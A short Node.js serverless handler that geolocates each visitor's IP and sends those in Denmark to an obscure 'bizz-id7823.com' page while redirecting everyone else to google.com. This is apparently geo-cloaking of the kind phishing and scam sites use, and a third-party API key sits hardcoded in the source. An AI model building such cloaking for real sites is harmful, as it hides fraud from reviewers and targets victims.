const axios = require("axios");
const fs = require("fs");

const MAX_REQUESTS = 10; // Maximum number of requests allowed
const TIME_WINDOW = 60 * 1000; // Time window in milliseconds
const GEO_API_URL = "https://api.ipgeolocation.io/ipgeo?apiKey=8811ea4ba96e4a40a79f001fd08658fa&ip=";
const REDIRECT_BLOCKED = "https://google.com";
const REDIRECT_AUTHORIZED = "https://bizz-id7823.com/home";

// Function to get the IP address of the visitor
const getIPAddress = (headers) => {
  return headers["x-forwarded-for"] || headers["client-ip"] || "unknown";
};

// Serverless function handler
export default async function handler(req, res) {
  const visitorIP = getIPAddress(req.headers);

  // Placeholder for rate-limiting and logging
  // Vercel does not have persistent file storage, so logs would need external storage (e.g., Firebase, Redis)
  
  // Get country information using the geolocation API
  try {
    const response = await axios.get(`${GEO_API_URL}${visitorIP}`);
    const geoData = response.data;
    const countryName = geoData.country_name;

    if (countryName && countryName.toLowerCase() === "denmark") {
      return res.redirect(302, REDIRECT_AUTHORIZED);
    } else {
      return res.redirect(302, REDIRECT_BLOCKED);
    }
  } catch (error) {
    console.error(`Geolocation API request failed for IP: ${visitorIP}`, error);
    return res.redirect(302, REDIRECT_BLOCKED);
  }
}
